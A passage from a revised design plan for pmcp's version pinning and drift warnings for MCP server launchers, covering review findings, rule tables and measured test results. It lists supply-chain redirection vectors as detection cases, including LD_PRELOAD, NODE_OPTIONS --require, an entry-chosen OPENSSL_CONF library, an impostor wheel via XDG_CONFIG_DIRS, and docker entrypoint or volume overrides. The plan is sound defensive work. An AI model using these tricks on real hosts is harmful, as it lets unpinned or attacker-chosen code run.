# Detailed plan: version pinning and drift detection for self-hosted-backed MCP clients (Consiliency/pmcp#294, proposals 1 and 2)

> **Bounded-plan verdict: within threshold.** Four source files change
> (`src/pmcp/manifest/loader.py`, `src/pmcp/tools/handlers.py`, `src/pmcp/types.py`,
> `src/pmcp/cli.py`), plus one new test file, a one-stub edit to
> `tests/test_pkgid_panel_fixes.py` (keeps an existing test offline), and three docs
> (README, CHANGELOG, CONTRIBUTING). There are two
> conceptually distinct changes: (1) a first-class `version:` / `server_version:` pin that
> `gateway.update_server` reports on, and (2) an advisory warning for an unpinned client
> in front of a self-hosted backend. Proposals 3 (post-update smoke probe) and 4 (client
> version in error hints) are **named follow-up slices** with a design note each. They are
> not planned here.
>
> **Base: `origin/main` = `876fd33`** (revisions 7-9, re-fetched for revision 9; `959d4d4` since revision 5). The reference patch applies to
> `876fd33` and to `959d4d4`, both of which carry Consiliency/pmcp#299 (the exact-version check follows
> npm's classification) and Consiliency/pmcp#300 (gateway tool schemas derived from their
> models). The plan branch itself still descends from `9ca081e`, and its commits change
> only this file and `plans/manifest.json`. The revision-9 numbers were **measured this
> session** on throwaway spike worktrees off `959d4d4`. Re-fetched for revision 7, main had
> moved to **`876fd33`** (Consiliency/pmcp#303: `auth.py`, `keyword_matcher.py`, a new test
> file and CHANGELOG, none of them touched by this plan). The patch applies to `876fd33`
> unchanged (byte-identical `git diff`), and the gates and the full suite were re-run there
> (Verification steps 3, 5 and 11). All spike worktrees were removed afterwards. The spike diff and the new test file are
> embedded verbatim below as the reference patch; extracting both from this file and
> `cmp`-ing them against the spike is part of Verification (step 11).

## Revision 9 (2026-09-27): board round 7 on `253445a`: every spawning argv; shipped declarations only

The round-7 claude seat returned DISAGREE, with two blocking findings inside the trust
boundary (B1, B2) and three non-blocking ones (N1-N3). Both blockers were **reproduced
first** against revision 8 (`repro_r9.py`, appendix).

**1. Every argv that can spawn the server is judged (B1).** I enumerated the spawn sites
from the code (`create_subprocess_exec` / `StdioServerParameters` in `src/pmcp`):

| spawn site | argv | how rev 9 treats it |
|---|---|---|
| `client/manager.py` `_connect_stdio`: connect, restart, lazy reconnect, and the respawn `gateway.refresh` triggers | `config.command` + `config.args` | judged, as before ("its args") |
| `manifest/refresher.py`: descriptions refresh (`StdioServerParameters`) | `config.command` + `config.args` | the same argv, already judged |
| `manifest/installer.py` `JobManager.start_install`, which `gateway.provision` calls; `_finalize_server_ready` **adopts that process as the live server** | `install[platform]` | **now judged**, every non-empty platform |
| `manifest/installer.py` `install_server` (one-shot install) | `install[platform]` (`wsl` falls back to `linux`) | **now judged**, by the same rule |
| `manifest/installer.py` install verify: `command args[:1] --help` | a probe of the entry's own command | not a server spawn; its command is the judged `command` |
| `tools/handlers.py` update probe: `<pkg>@latest --help` | a deliberate probe of latest, by `update_server` | not a server spawn; it is the update itself |

Install argvs are spawned only for a **manifest-sourced** server. A configured
(`.pmcp.json`/`.mcp.json`) server is lazily started by `ClientManager` from its own
`args` (`gateway.provision`: "User/project configured servers are lazy-started via
ClientManager"). So for `resolved.source == "manifest"`, `_install_argv_problem` requires
every non-empty `install[platform]` argv to pass the same rules as `args`:

- it is readable, via `_read_spawn_pin`: the same detection, the structural npx read when
  identity refuses, and `uv tool run` read as uvx;
- it names **the same package at the same pin**, the rule `provision_gate._config_runs_exactly`
  applies to approvals;
- it holds one exact version;
- it has a recognised shape;
- its env (the same `extra_env` and credential, `build_install_child_env`) is inert. Its
  cwd is pmcp's own.

The first failure is loud and names the argv, for example `its linux install argv (`npx -y
firecrawl-mcp`), which gateway.provision spawns and adopts as the live server, does not run
firecrawl-mcp@3.25.5 (it names firecrawl-mcp@latest)`. `update_server` applies the same
check before `[PINNED]`, so a divergent install argv is `floating_selector` / `[FLOATING]`.
A `version:` pin was already all-or-nothing across `args` and `install` (the
materialiser, D3). This closes the hand-pinned `args` case.

**2. Only the shipped manifest's declarations exempt a key (B2).** Revision 8 let an
entry's own `env_var`/`api_key_optional_when` exempt a key, guarded by a namespace
**denylist**, and the seat laundered `OPENSSL_CONF` (and `TARGET_CC`, `PROTOC`) through it.
Revision 9 removes the denylist (`_TOOL_ENV_*`, `_in_tool_namespace`). A key is the
server's own only if **pmcp's shipped `manifest.yaml`** declares it for that server name
(`_shipped_manifest_declarations`, read from the packaged file directly, never through
`load_manifest`, which applies overlays; cached once per process). Declarations in an
overlay, `.pmcp.json` or `.mcp.json` are entry-controlled and exempt nothing.
`code_patterns.yaml` declares no env keys (`grep -c` = 0). The shipped manifest declares
**84 names**, all application credentials or endpoints, from `AIRTABLE_API_KEY` to
`ZAPIER_MCP_URL`, including `FIRECRAWL_API_KEY` and `FIRECRAWL_API_URL`.

**3. N1-N3.**
- **N1:** the README now says an entry's `npm_config_@<scope>:registry` for a *dependency's*
  scope is allowed, because a pin holds the top-level package only. So the entry can
  redirect a dependency scope and the warning does not report it.
- **N2:** `docker run -it` (combined inert short flags) and `npx --yes=true` are modelled.
  `docker container run`, `uvx -qq`, `cargo install -fq` and `cargo install fc@1.2.3` stay
  loud or unpinned, which fails closed. main's `detect_package_type` does not read those
  spellings (it reads `docker container run` as the image `container`, and `uvx -qq` and
  `cargo -fq` as unknown), and changing that parser is outside this plan. The README lists
  them as known false positives.
- **N3:** the README says install argvs are judged too.

**Costs.**
- **Shipped cost** (`shipped_cost.py`, now including every install argv and the
  shipped-only declarations): **revision 8, 0 of 77; revision 9, 0 of 77.** Every
  shipped pinnable entry's args and install argvs agree once pinned, and the shipped
  manifest injects no undeclared keys. Step 7: `77 pinnable, 30 refused`.
- **Operator cost** (R13, restated). An overlay or config that injects an application key
  now warns "cannot verify" unless the **shipped** entry of that name declares it. In
  particular, an **overlay-only** self-hosted server (one the shipped manifest does not
  define) always warns, because its own relaxer variable is in its env and is not
  shipped-declared (measured: `SEMVER_API_URL` → cannot verify). The shipped `firecrawl`
  with its own `FIRECRAWL_API_URL`/`FIRECRAWL_API_KEY` stays silent. That covers the
  ViperJuice/dotfiles#325 shape.

| # | finding (round 7) | resolution | evidence (rev 8 → rev 9, `repro_r9.py`) |
|---|---|---|---|
| **B1** (blocking) | `gateway.provision` spawns and adopts `install[platform]`, but the warning and `[PINNED]` judged only `args`. Hand-pinned `args` plus a copied `install.linux: ["npx","-y","firecrawl-mcp"]` was silent while latest ran. | (1): every install argv of a manifest-sourced server must run the same exact pin in a recognised shape with an inert env, in the warning and in `update_server`. | `args pinned, linux install unpinned`: `None` → `... its linux install argv (`npx -y firecrawl-mcp`), which gateway.provision spawns and adopts as the live server, does not run ...`. `install via sh -c`: `None` → `... runs something pmcp cannot read`. Tests `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable` (4) and `test_update_server_never_labels_a_divergent_install_argv_pinned`. Mutants M97-M101. |
| **B2** (blocking) | The declared-key guard was a namespace denylist. An overlay declaring `OPENSSL_CONF` as `env_var` or relaxer made npx silent while node loaded an entry-chosen `.so`; `TARGET_CC`/`PROTOC` did the same for cargo. | (2): only the shipped manifest's declarations exempt a key. No namespace list remains. | Overlay `env_var: OPENSSL_CONF`, overlay relaxer `OPENSSL_CONF`, and cargo `TARGET_CC`: `None` → "cannot verify: the entry's env sets ...". Tests `test_an_overlay_declaration_exempts_no_key` (3); control `test_the_shipped_firecrawl_declarations_keep_a_self_hosted_pin_silent` (real shipped declarations). Mutant M96 (an overlay declaration exempts a key). |
| **N1** | A dependency-scope `@scope:registry` in the entry's env is allowed. | Documented (README, Non-goals): a pin holds the top-level package. | No change in behaviour. |
| **N2** | Benign spellings warned. | `-it` and `--yes=true` are modelled. The rest are documented as known false positives, because of main's parser. | `docker run -it`, `npx --yes=true`: "cannot verify" → `None`. Test `test_common_inert_spellings_are_recognised` (2). Mutants M102, M103. |
| **N3** | The README did not mention install argvs. | README updated. | Documentation. |

**Tests:** the revision-9 file has **230 tests** (219 in revision 8). Against the
revision-8 code it gives **11 failed, 219 passed**. The 11 are the 4 install-argv ids,
the `update_server` install test, the 3 overlay-declaration ids, the 2 N2 spellings, and
the allowlist unit test, which now asserts shipped-only declarations. The handler tests'
entries stand for shipped entries through one autouse fixture
(`_test_entries_are_shipped`, which extends the shipped declaration table). The fixture
uses `getattr(..., raising=False)`, so a run on revision 8 measures behaviour instead of
erroring. The overlay-only tests use a name outside that table.

## Rev 8 board findings — before/after, measured

`repro_r9.py` (appendix), one fresh process per row: a manifest-sourced entry, npm
identity read with the node-less tables, and the self-hosted relaxer set. Trees:
`876fd33` + the revision-8 patch (`253445a`), and `876fd33` + the revision-9 patch.

| case | rev 8 | rev 9 |
|---|---|---|
| B1 `args: -y firecrawl-mcp@3.25.5`, `install.linux: npx -y firecrawl-mcp` | `None` | cannot verify: `its linux install argv (`npx -y firecrawl-mcp`), which gateway.provision spawns and adopts as the live server, does not run firecrawl-mcp@3.25.5 (it names firecrawl-mcp@latest)` |
| B1 `install.linux: sh -c "npx -y firecrawl-mcp"` | `None` | cannot verify: `its linux install argv (...) runs something pmcp cannot read` |
| B2 overlay-only entry, `env_var: OPENSSL_CONF` | `None` | cannot verify (`the entry's env sets FIRECRAWL_API_URL`, the first undeclared key; `OPENSSL_CONF` is undeclared too) |
| B2 overlay-only entry, relaxer `OPENSSL_CONF` | `None` | cannot verify: `the entry's env sets OPENSSL_CONF` |
| B2 overlay-only cargo entry, `env_var: TARGET_CC` | `None` | cannot verify (the entry's env holds undeclared keys) |
| N2 `docker run -it --rm example/client@sha256:...` | cannot verify (`its argv passes -it`) | `None` |
| N2 `npx --yes=true firecrawl-mcp@3.25.5` | cannot verify (`its argv passes --yes`) | `None` |
| cost: overlay-only self-hosted entry with an app relaxer `SEMVER_API_URL` | `None` | cannot verify: `the entry's env sets SEMVER_API_URL` (R13) |
| control: shipped `firecrawl`, args and every install argv pinned | `None` | `None` |

## Revision 8 (2026-09-27): board round 6 on `15dae94`: allowlists, not denylists

> **Superseded in part by revision 9.** The declared-key rule below (an entry's own
> declarations, guarded by a namespace list) is replaced by shipped-manifest declarations
> only, and install argvs are judged too. The shape and env allowlists stand.

The round-6 claude seat returned DISAGREE, with two blocking findings inside the trust
boundary (X1, X2) and four non-blocking ones (N1-N4). Each was **reproduced first**
against revision 7 (`repro_r8.py`, appendix). All six share **one root cause**: both
entry rules in revision 7 were **denylists**, and a denylist fails open on every spelling
it does not list. Revision 7 listed "keys that redirect" (`XDG_CONFIG_HOME`, not
`XDG_CONFIG_DIRS`; not `LD_PRELOAD` or `CC`) and "flags that redirect" (not a container
command after the image, not `npx -p X sh`, not `uvx --from X sh`). Revision 8 **inverts
both rules**:

1. **ENV is an allowlist.** Every key in the entry's env block (`config.env`, including an
   overlay's `server_env`) must be **proven inert** for the launcher. Otherwise the exact
   pin is "cannot verify". A key is inert only if it is one of:
   - **one of the server's own declared keys**: the entry's `env_var` and its
     `api_key_optional_when` relaxers. The MCP server reads these; the launcher and its
     package manager never do. A declared name that falls in a tool namespace (`NPM_`,
     `NODE_`, `UV_`, `PIP_`, `PYTHON*`, `CARGO_`, `RUSTUP_`, `RUSTC*`, `DOCKER_`, `XDG_`,
     `LD_`, `DYLD_`, `SSL_`, `GIT_`, `PATH`, `HOME`, `CC`, the proxies ...) is **not**
     treated as the server's own, so an overlay cannot launder `NPM_CONFIG_REGISTRY`
     through `env_var:`. That guard only narrows the allowlist; it is not the rule;
   - **locale/terminal/colour**: `LANG`, `LANGUAGE`, `LC_*`, `TERM`, `TZ`, `NO_COLOR`,
     `FORCE_COLOR`;
   - **per launcher, the short logging/timing/credential lists** kept from revision 7:
     npm's 17 `npm_config_*` keys, `//host/:` credentials and another scope's
     `@scope:registry`; uv's `UV_NO_PROGRESS`, `UV_HTTP_TIMEOUT`, `UV_HTTP_RETRIES` and
     `UV_INDEX_<N>_USERNAME/PASSWORD`; cargo's 8 `CARGO_TERM_*`/timing keys and its
     registry tokens. docker has none.

   Everything else is not inert: an unknown key, `XDG_*`, `LD_*`, `CC`, a proxy, a CA file.
   **Values are not special-cased.** An empty value of a key that is not inert is still
   not inert. That closes N1: an empty `PATH` made exec search the cwd.
2. **ARGV is an allowlist of SHAPES.** The exact pin is silent only when the argv
   matches a recognised shape in which **the pinned package is what runs**:

   | launcher | recognised shape | inert flags | not a shape (loud) |
   |---|---|---|---|
   | npx | `npx [flags] <pkg>@<exact> [arguments to the package]` | `-y`, `--yes`, `-q`, `--quiet` | any other flag, incl. `-p`/`--package X <cmd>` |
   | `npm exec` / `npm x` | `npm exec [flags] <pkg>@<exact> [args]` | as npx | any other subcommand |
   | uvx, and `uv tool run` (judged as uvx) | `uvx [flags] <req==exact> [args]` or `uvx [flags] --from <req==exact> <req's own name> [args]` | `-q`, `--quiet`, `-v`, `--verbose`, `--no-progress`, `--isolated`, `--refresh`, `--no-cache`, `-n`, `--color <v>` | `--from X <other command>` (e.g. `sh -c`); `--python` (as `UV_PYTHON`, N3); any index/with/overrides/config flag |
   | cargo | `cargo install [flags] <crate> --version <exact> [flags]` | `--locked`, `-q`, `-v`, `-f`, `--force`, `--color <v>`, `-j/--jobs <n>` | `+toolchain` (as `RUSTUP_TOOLCHAIN`, N3); any source flag (`--git`, `--registry`, `--path` ...) |
   | docker | `docker run [flags] [-e KEY[=V]]* <image>@<digest>` and **nothing after the image** | `-i`, `-t`, `--rm`, `--init`, `--pull <v>`, `--name <v>`, `--network <v>`, `--platform <v>`; `-e KEY` only when KEY is inert by rule 1 (docker's family: declared/locale keys only) | a container command after the image; `--entrypoint`; `-v`/`--volume`/`--mount`; `--env-file`; `-e NODE_OPTIONS=...`; any other flag |

   Arguments **after** the package (npx, uvx) are the package's own. An unrecognised
   flag or shape is loud. The same shape check drives `update_server`: an exact selector
   in an unrecognised shape is `floating_selector`/`[FLOATING]`, never `[PINNED]`.
3. **Launchers.** `uv tool run` is judged as uvx. Package runners and wrappers pmcp does
   not model are "cannot verify", pinned or not: `bunx`, `bun`, `pnpx`, `pnpm` (`dlx`),
   `yarn` (`dlx`), `uv` (other than `tool run`), `deno`, `node <script>`, the shells
   (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `cmd`, `powershell`, `pwsh`) and `env`.
   Any **other** command, such as a locally installed server binary, is the host's and is
   not judged. The README says so.
4. **What a docker digest pins.** It pins the **image**, not what runs in it. The
   container command, entrypoint, mounts and env decide that, which is why the shape
   forbids them (D7, README).

| # | finding (round 6) | resolution | evidence (rev 7 → rev 8, `repro_r8.py`) |
|---|---|---|---|
| **X1** (blocking) | The argv's command slot could run something other than the pinned package: `docker run ... node@sha256:... npx -y semver` ran the latest semver; also `--entrypoint`, `-v`, `-e NODE_OPTIONS=`; `npx -y -p semver@7.6.0 sh -c ...` and `uvx --from cowsay==6.1 sh -c ...` ran `sh`. All were silent and `[PINNED]`. | Shape allowlist (2), and the same check in `update_server`. | Each case: `None` → "cannot verify" naming the problem (`its argv passes a container command after the image ('npx')`, `its argv passes --entrypoint`, `its argv passes -v`, `its argv sets container env NODE_OPTIONS`, `its argv passes -p`, `its argv runs 'sh' from the --from environment ...`). `update_server` for the docker case: `floating_selector=<digest>`, `[FLOATING]`. Tests `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable` (9 ids) and `test_update_server_never_labels_a_container_command_pinned`. Mutants M82, M84-M90, M93, M94. |
| **X2** (blocking) | An entry `XDG_CONFIG_DIRS` redirected uv to an impostor wheel through a system `uv.toml`. `XDG_CACHE_HOME` was silent while `UV_CACHE_DIR` was loud. | Env allowlist (1): no `XDG_*` key is inert. | `XDG_CONFIG_DIRS`, `XDG_CACHE_HOME`: `None` → `the entry's env sets XDG_...`. Test `test_an_entry_key_not_proven_inert_is_unverifiable` (5 ids, incl. an unknown key). Mutants M75, M95. |
| **N1** | Empty values were skipped for every key, but only npm skips them, so `PATH=""` made exec search the cwd. | Values are not special-cased (1). | `PATH=""`: `None` → `the entry's env sets PATH`. Test id `empty-path`. |
| **N2** | The README said "the launcher", but `uv tool run`, `bunx`, `pnpx`, `pnpm dlx`, `sh -c`, `env` and `node npx-cli.js` were silent even unpinned. | (3): `uv tool run` is judged as uvx, and the unmodelled runners/wrappers are loud. The README names the judged launchers and says other commands are not judged. | `uv tool run cowsay`: `None` → `is unpinned`; `bunx`, `pnpm dlx`, `sh -c`: `None` → `a package runner or wrapper pmcp does not model`. Tests `test_an_unmodelled_runner_or_wrapper_is_unverifiable` (7), `test_uv_tool_run_is_judged_as_uvx`. Mutants M91, M92. |
| **N3** | `uvx --python` was inert while `UV_PYTHON` was loud; `cargo +nightly` was silent (identified as `'+nightly'`) while `RUSTUP_TOOLCHAIN` was loud. | `--python` is not an inert uvx flag, and a `+toolchain` is not a cargo shape. | Both: `None` → "cannot verify" (`its argv passes --python`; `its argv selects toolchain +nightly`). The cargo package name is still read as `+nightly` by main's `detect_package_type`; the message names the toolchain. Mutant M87. |
| **N4** | `LD_PRELOAD`, `CC`, `CFLAGS` were silent outside the family prefixes. | The env allowlist (1) makes every such key loud. | `LD_PRELOAD` (npx), `CC` (cargo): `None` → "cannot verify". Controls stay silent: the firecrawl self-hosted config with its declared `FIRECRAWL_API_URL`/`FIRECRAWL_API_KEY`, a docker digest with `-e FIRECRAWL_API_URL`, and `uvx --from cowsay==6.1 cowsay`. Mutants M77, M78 (the declared and locale keys must stay inert), M76 (the namespace guard). |

**Shipped-coverage cost (measured, `shipped_cost.py`).** For every shipped entry a
`version:` pin can reach (step 7's 77), the pin was applied at `1.0.0`, the config the
gateway would spawn was built (`manifest_server_to_config`), and each revision was asked
whether that exact pin is silent. Result: **revision 7, 0 of 77 not silent; revision 8,
0 of 77 not silent.** The one shipped relaxer entry (`firecrawl`) is silent on both, with
its self-hosted `FIRECRAWL_API_URL` declared. So the allowlists cost nothing in shipped
coverage. Their cost falls on operator configs that inject **undeclared** keys: for
example, a `.pmcp.json` that sets `FIRECRAWL_RETRY_MAX_ATTEMPTS` next to the pin now warns
"cannot verify" (R13). Step 7 is unchanged at `77 pinnable, 30 refused`.

**Tests:** the revision-8 file has **219 tests** (190 in revision 7). Against the
revision-7 code it gives **24 failed, 195 passed**:

- the 9 unrecognised-shape ids;
- the 5 not-inert-key ids;
- the 7 runner/wrapper ids;
- the allowlist unit test;
- the `update_server` `[FLOATING]` test;
- the `uv tool run` test.

Three revision-7 controls changed their argv or env to stay inside the new shapes: the uvx
control drops `--python`, the uvx cwd case uses the `--from` package's own name, and the
npm control swaps an empty `npm_config_package` for the declared `SELFHOST_API_KEY=""` and
`LANG`. The new controls (`test_a_recognised_shape_with_an_exact_pin_is_silent`, 6 ids)
are green on both revisions.

**What stays as revision 7:** the pin grammar and materialiser (`loader.py`, so the
corpus is unaffected; re-run anyway), per-launcher exactness and the PEP 508 check, the
trust boundary (host state is trusted), the cwd ruling, and the NB-1 cause.

## Rev 7 board findings — before/after, measured

`repro_r8.py` (appendix), one fresh process per row, npm identity read with the node-less
tables. Trees: `876fd33` + the revision-7 patch (`15dae94`), and `876fd33` + the
revision-8 patch. The self-hosted relaxer (`FIRECRAWL_API_URL`) is set in the entry's env.

| case | rev 7 | rev 8 |
|---|---|---|
| X1 `docker run --rm --network host node@sha256:... npx -y semver --help` | `None` | cannot verify: `its argv passes a container command after the image ('npx') ...` |
| X1 `docker run --entrypoint /bin/sh node@sha256:... -c "npx -y firecrawl-mcp"` | `None` | cannot verify: `its argv passes --entrypoint` |
| X1 `docker run -v /srv/evil:/app node@sha256:...` | `None` | cannot verify: `its argv passes -v` |
| X1 `docker run -e NODE_OPTIONS=--require=/x node@sha256:...` | `None` | cannot verify: `its argv sets container env NODE_OPTIONS` |
| X1 `npx -y -p semver@7.6.0 sh -c ...` | `None` | cannot verify: `its argv passes -p` |
| X1 `uvx --from cowsay==6.1 sh -c ...` | `None` | cannot verify: `its argv runs 'sh' from the --from environment, not the 'cowsay' package's own command` |
| X2 uvx, entry `XDG_CONFIG_DIRS` | `None` | cannot verify: `the entry's env sets XDG_CONFIG_DIRS` |
| X2 uvx, entry `XDG_CACHE_HOME` | `None` | cannot verify: `the entry's env sets XDG_CACHE_HOME` |
| N1 npx, entry `PATH=""` | `None` | cannot verify: `the entry's env sets PATH` |
| N2 `uv tool run cowsay` (unpinned) | `None` | `... is unpinned ...` |
| N2 `bunx semver@7.6.0` / `pnpm dlx semver@7.6.0` / `sh -c "npx -y semver@7.6.0"` | `None` | cannot verify: `it launches through 'bunx'` / `'pnpm'` / `'sh'`, `a package runner or wrapper pmcp does not model` |
| N3 `uvx --python /srv/python cowsay==6.1` | `None` | cannot verify: `its argv passes --python` |
| N3 `cargo +nightly install fc --version 1.2.3` | `None` | cannot verify: `its argv selects toolchain +nightly` |
| N4 npx, entry `LD_PRELOAD` | `None` | cannot verify: `the entry's env sets LD_PRELOAD` |
| N4 cargo, entry `CC` | `None` | cannot verify: `the entry's env sets CC` |
| control: npx `firecrawl-mcp@3.25.5`, entry `FIRECRAWL_API_URL` + `FIRECRAWL_API_KEY` | `None` | `None` |
| control: `docker run -i --rm -e FIRECRAWL_API_URL node@sha256:...` | `None` | `None` |
| control: `uvx --from cowsay==6.1 cowsay` | `None` | `None` |

## Revision 7 (2026-09-27): board round 5 on `cfedeca`, and the trust boundary

> **Superseded in part by revision 8.** Revision 7's entry rules were denylists (keys and
> flags that redirect). Revision 8 inverts both into allowlists (env keys proven inert;
> argv shapes in which the pinned package runs). The trust boundary, the cwd ruling and
> the exactness fixes below stand.

The round-5 claude seat returned DISAGREE, with two blocking findings (B1, B2) and five
non-blocking ones (N1-N5). Each was **reproduced first** against revision 6. The
maintainer then set the scope for this revision:

> **Trust the host.** The host's own npm/uv/cargo configuration is the operator's trusted
> environment, like `PATH` already is: npmrc files at every level, the operator's shell
> environment, shims, caches, global bins, and proxy/CA settings. The warning fails loud
> only on what a manifest entry or overlay controls: its argv (pin grammar, per-launcher
> exactness), the env block it injects into the child, and its launcher.

Revision 7 implements that boundary. It cuts revision 6's host discovery (npmrc walking,
the local-prefix search, the host-environment scan) back to **the entry's own env block**
(`config.env`, which carries an overlay's `server_env`). It applies the same entry rule to
uvx and cargo, and states the boundary as a non-goal here and in the README text
(Documentation impact). Tests that are red on revision 6 exist wherever behaviour changes.
Mutants M57-M71 cover the new rules. The rev-6 host-discovery mutants (M41, M42, M45-M50,
M54-M56) are retired with the code they mutated. M10 and M18 are re-targeted at
`_argv_pin_is_exact`.

| # | finding (round 5) | resolution | evidence |
|---|---|---|---|
| **B1** (blocking) | Revision 6 located the builtin and global npmrc through `realpath(which(npx/node))`. A wrapper shim (asdf, Volta, mise, a two-line `exec` script) sent that lookup to the wrong place, so a redirecting npmrc was missed while npx ran the impostor. | **Out of scope by the trust boundary.** npmrc files at every level, shims and the host's node/npm install are the operator's. The whole discovery (`_npm_config_files`, `_npmrc_redirecting_key`, the `_has_local_prefix` walk, the host-env scan) is **removed**, so no fail-open lookup remains to be fooled. The non-goal names shims and npmrc explicitly. | Rev 6 was silent in the seat's shim rows. Rev 7 is silent in **every** host-npmrc/local-project case, by design: `test_the_hosts_npm_configuration_files_are_trusted` (user, cwd, local prefix, global, builtin × 2 identity modes) is **10 red on rev 6**, which warned there. |
| **B2** (blocking) | An exact non-npm pin had no context check: `uvx --from cowsay==6.1` ran 6.0 under `UV_OVERRIDE`, `UV_INDEX_URL` redirected the index, and `cargo install --git ... --version 1.2.3` was `exact True`, all silent. | **In scope for what the entry sets.** One entry rule for every launcher (`_entry_redirect`). (1) The **entry's env block**: `PATH`, `HOME`, `XDG_CONFIG_HOME`, the proxy variables (any case) and `SSL_CERT_FILE`/`SSL_CERT_DIR`/`NODE_EXTRA_CA_CERTS` for all launchers, plus each family's own keys. npm: `npm_config_*`, `nvm_*`, `NODE_OPTIONS`, `NODE_PATH`, `PREFIX`, `DESTDIR`. pypi: `UV_*`, `PIP_*`, `PYTHONPATH`, `PYTHONHOME`. cargo: `CARGO_*`, `RUSTUP_*`, `RUSTC`, `RUSTC_WRAPPER`, `RUSTC_WORKSPACE_WRAPPER`, `RUSTFLAGS`, `RUSTDOCFLAGS`. docker: `DOCKER_*`. Each gives "cannot verify" unless it is on a small allowlist (below). (2) **argv flags** for uvx (up to the command) and cargo (anywhere): any flag outside a small allowlist (output, the interpreter, `--from`, `--version`, `--locked`, `--force`, `--jobs`) is loud, e.g. `--index-url`, `--with`, `--overrides`, `--git`, `--registry`. A uvx/cargo `UV_*`/`CARGO_*` setting the **host** exports is trusted, like any host setting. | Rev 6 → rev 7 (measured, `repro_r7.py`): entry `UV_OVERRIDE`, entry `UV_INDEX_URL`, argv `--index-url`, cargo argv `--git`, and entry `CARGO_REGISTRIES_X_INDEX`: **`None` → "cannot verify ... names the setting"**. Host `UV_OVERRIDE`: `None` → `None` (trusted). Tests: `test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv` (6) and `..._cargo_..._redirects_cargo` (4), **all 10 red on rev 6**. Controls `..._is_silent_without_an_entry_redirect` (uvx, cargo) are green on both. Mutants M57, M59, M60, M62-M64, M70, M71. |
| **N1** | The rev-6 comment called a relocated `cache` "the same content-addressed store"; libnpmexec runs an existing `_npx/<hash>/node_modules/<pkg>` on its `package.json`'s word. | Comment corrected. The **host's** cache is trusted (the non-goal names the npx cache). An **entry-injected** `npm_config_cache` is loud, because the entry chose a directory whose contents can change what runs. | Rev 6 `None` → rev 7 "cannot verify ... the entry's env sets npm_config_cache". Test id `entry-cache` (×2), red on rev 6. |
| **N2** | A file named like the slot in the global bin runs before any registry lookup. | **Out of scope**: the global bin is the host's (named in the non-goal). | Documentation only. |
| **N3** | The proxy/CA environment spellings were not held to the key rule. | **In the entry's env**: `HTTP(S)_PROXY`, `ALL_PROXY`, `NO_PROXY`, `PROXY` (any case), `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` are loud for every launcher. **In the host's env**: trusted. `NODE_TLS_REJECT_UNAUTHORIZED` is not listed: npm passes its `strict-ssl` default, so it is not read (the seat's own finding). | Rev 6 `None` → rev 7 "cannot verify" for entry `HTTPS_PROXY`; host `HTTPS_PROXY` `None` on both. Test ids `entry-https-proxy`, `entry-https-proxy-lower`, `entry-extra-ca` (×2), red on rev 6. Mutant M59. |
| **N4** | A pin holds only the top-level package; the dependency closure resolves fresh. | Wording: `_npm_key_can_redirect` is documented as judged for the **top-level** package, and the warning says "hold the top-level package at the pinned version". An entry's `@other:registry` for another scope stays quiet. The non-goal says a pin does not hold dependencies. | Control `test_entry_settings_that_cannot_redirect_keep_an_exact_pin_silent`. Mutant M51 is kept. |
| **N5** | Exactness nits: a uvx URL requirement read `==` from its fragment; PyPI `==1.0` versus a local `+x`; an upper-case docker digest was labelled a tag; an unreadable docker/uvx argv was silent. | (a) `_uvx_requirement_is_exact` parses PEP 508 with `packaging`: a URL requirement is **never exact**, and exact means exactly one `==` without a wildcard. `_argv_pin_is_exact` applies it in both the warning and the `[PINNED]` report. (b) `==1.0` is kept exact: a public index must not host local versions (PEP 440), and a non-default index or find-links reaches uvx only through host config (trusted) or the entry's env/argv (now loud). (c) A digest-shaped but malformed pin is labelled `a malformed content digest ...`. (d) A launcher whose argv pmcp reads (`uvx`, `pip`, `pip3`, `cargo`, `docker`, any spelling) with an argv it cannot read (an unknown flag, a non-bare spelling) fails loud, as the npm family does since round 3 N-b. | Rev 6 → rev 7: the URL requirement `None` → `floats on '1.0.0' (not one exact PEP 440 version from an index)`; the upper-case digest `(a docker tag, ...)` → `(a malformed content digest ...)`; `docker run --some-future-flag img:3.25.5` and `uvx --some-future-flag cowsay==6.1`: `None` → "cannot verify: it cannot read which package this ... argv runs". Tests `test_a_uvx_url_requirement_is_never_an_exact_pin`, `test_docker_digest_labels_and_the_entrys_docker_env`, `test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher` (3): **5 red on rev 6**. Mutants M66, M67, M69. |
| **cwd** (coordinator ruling on revision 7) | Revision 7 had treated every cwd as the host's. But an entry or overlay that **sets** `cwd` chooses which directory's project configuration the launcher reads. | **An entry-set `cwd` is entry-controlled.** For launchers whose resolution reads cwd-relative configuration, an exact pin with an entry-set `cwd` is "cannot verify": `the entry sets cwd '<dir>', whose project configuration <npm\|uv\|cargo> reads`. That covers npm/npx (a `.npmrc` at the local prefix, found by walking up for `package.json`/`node_modules`, and a local bin there), uvx (`uv.toml` / `pyproject.toml` `[tool.uv]` up the tree) and cargo (`.cargo/config.toml` in the cwd and every parent). pmcp does not read the directory: that the entry chose it is enough. **docker is exempt.** `docker run` reads no cwd-relative configuration (its client config is `~/.docker` or `DOCKER_CONFIG`, which the env rule covers), and a digest is content-addressed. **With no entry-set cwd** the child inherits pmcp's own cwd, which stays the host's. Only a configured entry (`.mcp.json` / `.pmcp.json` / project config) can set `cwd`. The manifest's `ServerConfig` has no `cwd` field, and the shipped manifests set none: `grep -cE '^\s*cwd\s*:'` gives **0** for `manifest.yaml` and 0 for `code_patterns.yaml`. So shipped coverage is unchanged (step 7: `77 pinnable, 30 refused`). | `test_an_entry_set_cwd_makes_an_exact_pin_unverifiable` (npx, uvx, cargo) is **3 red on the first rev-7 cut** (`1073923`). The control `test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts` is green on both. Mutants M72 (entry cwd ignored), M73 (docker counted cwd-sensitive), M74 (the inherited host cwd judged too). |

**The small allowlists** (entry env; everything else in a family's namespace is loud):

- **npm** (`npm_config_*`, judged after npm's own `loadEnv` normalisation): 17 keys. The
  output/logging keys `loglevel`, `color`, `progress`, `timing`, `unicode`, `logs-dir`,
  `logs-max`, `fund`, `audit`, `update-notifier`; the install prompt `yes`; the network
  timing keys `fetch-retries`, `fetch-retry-factor`, `fetch-retry-maxtimeout`,
